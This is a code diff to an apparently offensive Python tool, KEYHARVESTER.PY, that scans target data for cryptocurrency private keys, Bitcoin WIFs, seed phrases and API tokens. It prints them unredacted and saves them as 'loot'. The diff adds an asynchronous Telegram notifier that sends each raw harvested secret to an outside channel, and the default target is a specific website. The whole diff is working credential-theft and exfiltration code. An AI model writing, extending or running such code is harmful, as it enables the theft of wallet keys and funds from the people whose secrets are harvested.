@@ -1,20 +1,23 @@
 #!/usr/bin/env python3
 """
-KEYHARVESTER.PY — Active Cryptographic Secret & Artifact Discovery Engine v7.6
+KEYHARVESTER.PY — Active Cryptographic Secret & Artifact Discovery Engine v8.0 (With Telegram Telemetry)
 Features:
 - Live unredacted extraction of EVM private keys, Bitcoin WIFs, and BIP39 seed phrases
 - Direct on-screen terminal streaming of harvested raw secrets and API tokens
 - Automated immutable disk persistence (loot_output/) via centralized framework logger
 - Anti-noise validation filters for high-precision cryptographic detection
+- Real-time asynchronous Telegram notification dispatch for unredacted cryptographic loot
 """
 import re
 import sys
 import os
 import hashlib
+import asyncio
 
-# Import centralized framework telemetry and immutable loot persistence
+# Import centralized framework telemetry, immutable loot persistence, and Telegram notifier
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
+from modules.telegram_notifier import send_telegram_alert
 
 COLORS = {
     "RED": "\033[91m",
@@ -37,6 +40,17 @@ NOISE_WORDS = {
 def terminal(message):
     sys.stdout.write(message + "\n")
     sys.stdout.flush()
+
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from synchronous keyharvester functions."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
 
 def is_valid_bip39_seed(text):
     if not isinstance(text, str):
@@ -94,6 +108,16 @@ def _record_finding(findings, seen, secret, secret_type, offset, target_context=
     terminal(f"  ├── Offset      : {offset}")
     terminal(f"  └── Raw Secret  : {COLORS['GREEN']}{secret}{COLORS['RESET']}")
 
+    loot_payload = {
+        "secret_type": secret_type,
+        "source": target_context,
+        "offset": offset,
+        "raw_secret": secret
+    }
+
+    # BROADCAST UNREDACTED CRYPTOGRAPHIC LOOT STRAIGHT TO TELEGRAM
+    broadcast_tg_alert_sync(f"Cryptographic Secret Harvested [{secret_type}]", loot_payload)
+
     # STREAM TELEMETRY & PERSIST CRYPTOGRAPHIC LOOT TO DISK IMMEDIATELY
     stream_proof("CRYPTO_SECRET_HARVESTED", f"offset_{offset}", {"secret_type": secret_type}, secret[:12] + "...", {"exposed": True})
     save_session_loot(
@@ -103,13 +127,13 @@ def _record_finding(findings, seen, secret, secret_type, offset, target_context=
         status=200,
         headers={},
         body=secret,
-        extra_loot={"secret_type": secret_type, "offset": offset, "raw_secret": secret}
+        extra_loot=loot_payload
     )
 
 def harvest_private_keys(target_source_data="", target_context="https://cryptobytes.online"):
     terminal(
         f"\n{COLORS['MAGENTA']}[***] "
-        f"ACTIVE CRYPTOGRAPHIC SECRET DISCOVERY & HARVESTING (V7.6 HARDENED) "
+        f"ACTIVE CRYPTOGRAPHIC SECRET DISCOVERY & HARVESTING (V8.0 HARDENED) "
         f"[***]{COLORS['RESET']}"
     )
     findings = []
